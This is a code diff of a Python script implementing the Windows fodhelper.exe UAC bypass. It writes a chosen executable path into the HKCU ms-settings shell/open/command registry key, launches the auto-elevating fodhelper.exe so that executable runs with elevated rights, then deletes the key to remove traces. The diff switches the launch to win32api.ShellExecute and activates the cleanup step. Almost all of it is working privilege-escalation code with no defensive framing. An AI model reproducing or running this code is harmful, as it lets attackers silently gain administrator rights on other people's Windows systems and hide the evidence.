@@ -5,10 +5,9 @@ Fodhelper.exe was introduced in Windows 10 to manage optional features like
 region-specific keyboard settings. Its location is: C:\Windows\System32\fodhelper.exe
 and it is signed by Microsoft.
 """
-  
-import os
 import _winreg
-import requests
+import win32api
+import win32con
 
 def fodhelper_dll_hijack(executable_path):
 	registry_path = r"Software\Classes\ms-settings\Shell\Open\command"
@@ -19,16 +18,12 @@ def fodhelper_dll_hijack(executable_path):
 		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,executable_path)
 	except Exception as e:
 		return False
-
 	try:
-		if (os.popen("C:\Windows\System32\fodhelper.exe") == 0):
-			return True
-		else:
-			return False
-	except Exception as e:
+		win32api.ShellExecute(0,None,"c:\windows\system32\fodhelper.exe", None, None, win32con.SW_SHOW)
+	except Exception as error:
+		return False	
+	
+	try:
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\ms-settings\Shell\Open\command")
+	except Exception as error:
 		return False
-		
-	#try:
-	#	_winreg.DeleteKey("Software\Classes\ms-settings\Shell\Open\command")
-	#except Exception as e:
-	#	return False
